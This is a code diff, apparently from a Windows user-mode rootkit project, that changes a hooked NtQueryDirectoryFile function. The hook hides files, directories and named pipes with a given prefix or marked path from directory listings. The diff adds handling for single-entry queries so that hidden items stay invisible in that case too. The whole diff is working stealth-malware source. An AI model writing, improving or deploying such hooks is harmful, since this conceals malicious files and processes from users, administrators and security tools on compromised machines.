@@ -217,10 +217,6 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 	// Hide files, directories and named pipes
 	if (NT_SUCCESS(status) && (fileInformationClass == FileDirectoryInformation || fileInformationClass == FileFullDirectoryInformation || fileInformationClass == FileIdFullDirectoryInformation || fileInformationClass == FileBothDirectoryInformation || fileInformationClass == FileIdBothDirectoryInformation || fileInformationClass == FileNamesInformation))
 	{
-		LPVOID current = fileInformation;
-		LPVOID previous = NULL;
-		ULONG nextEntryOffset;
-
 		WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
 		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
 		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };
@@ -228,34 +224,51 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
 		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
 
-		do
+		// github issue #104
+		if (returnSingleEntry)
 		{
-			nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
-
-			if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+			// When returning a single entry, skip until the first item is found that is not hidden.
+			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
 			{
-				if (nextEntryOffset)
-				{
-					i_memcpy
-					(
-						current,
-						(LPBYTE)current + nextEntryOffset,
-						(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
-					);
-					continue;
-				}
-				else
-				{
-					if (current == fileInformation) status = STATUS_NO_MORE_FILES;
-					else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
-					break;
-				}
+				status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
+				if (status) break;
 			}
-
-			previous = current;
-			current = (LPBYTE)current + nextEntryOffset;
 		}
-		while (nextEntryOffset);
+		else
+		{
+			LPVOID current = fileInformation;
+			LPVOID previous = NULL;
+			ULONG nextEntryOffset;
+
+			do
+			{
+				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
+
+				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+				{
+					if (nextEntryOffset)
+					{
+						i_memcpy
+						(
+							current,
+							(LPBYTE)current + nextEntryOffset,
+							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
+						);
+						continue;
+					}
+					else
+					{
+						if (current == fileInformation) status = STATUS_NO_MORE_FILES;
+						else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
+						break;
+					}
+				}
+
+				previous = current;
+				current = (LPBYTE)current + nextEntryOffset;
+			}
+			while (nextEntryOffset);
+		}
 	}
 
 	return status;
